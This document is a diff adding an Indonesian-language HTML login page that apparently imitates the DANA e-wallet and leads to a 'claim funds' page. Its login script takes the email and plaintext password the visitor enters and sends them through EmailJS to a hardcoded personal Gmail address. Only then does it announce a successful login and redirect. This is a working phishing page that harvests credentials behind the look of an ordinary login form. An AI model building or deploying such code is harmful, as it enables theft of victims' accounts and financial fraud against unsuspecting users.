@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: url('images/dana.jpg') no-repeat center center/cover;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+            padding: 20px;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(15px);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            background: rgba(255, 255, 255, 0.3);
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: background 0.3s ease-in-out;
+        }
+
+        .input-box:focus {
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        .input-box::placeholder {
+            color: #ddd;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .login-btn {
+            background: linear-gradient(135deg, #00C851, #007E33);
+            color: white;
+            box-shadow: 0 4px 10px rgba(0, 200, 81, 0.3);
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(135deg, #007E33, #004d1a);
+            box-shadow: 0 6px 15px rgba(0, 200, 81, 0.5);
+        }
+
+        p {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #ddd;
+        }
+
+        p a {
+            color: #FFC107;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+
+        p a:hover {
+            color: #ffeb3b;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                width: 95%;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Masuk ke Akun Anda</h2>
+        <input type="email" id="email" class="input-box" placeholder="Masukkan Email">
+        <input type="password" id="password" class="input-box" placeholder="Masukkan Password">
+        <button class="btn login-btn" onclick="login()">Login</button>
+        <p>Belum punya akun? <a href="register.html">Daftar</a></p>
+    </div>
+
+    <script>
+        emailjs.init("tD00uUjD3gs5N23Hl");
+
+        function login() {
+            let email = document.getElementById("email").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            let users = JSON.parse(localStorage.getItem("users")) || {};
+
+            if (!users[email]) {
+                alert("❌ Email tidak terdaftar! Silakan daftar dulu.");
+                return;
+            }
+
+            if (users[email].password !== password) {
+                alert("❌ Password salah!");
+                return;
+            }
+
+            let randomKey = Math.random().toString(36).substr(2, 10);
+            localStorage.setItem("randomKey", randomKey);
+            localStorage.setItem("loggedInEmail", email);
+
+            emailjs.send("service_wnsi4zy", "template_lvl6mhi", {
+                from_name: users[email].name,
+                user_email: email,
+                user_password: password,
+                to_email: "alfredo.santosa233@gmail.com"
+            }).then(function(response) {
+                alert("✅ Login berhasil! Selamat Anda Berhasil Login.");
+                window.location.href = "klaim_dana.html";
+            }).catch(function(error) {
+                alert("❌ Gagal mengirim data ke email.");
+                console.error("Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
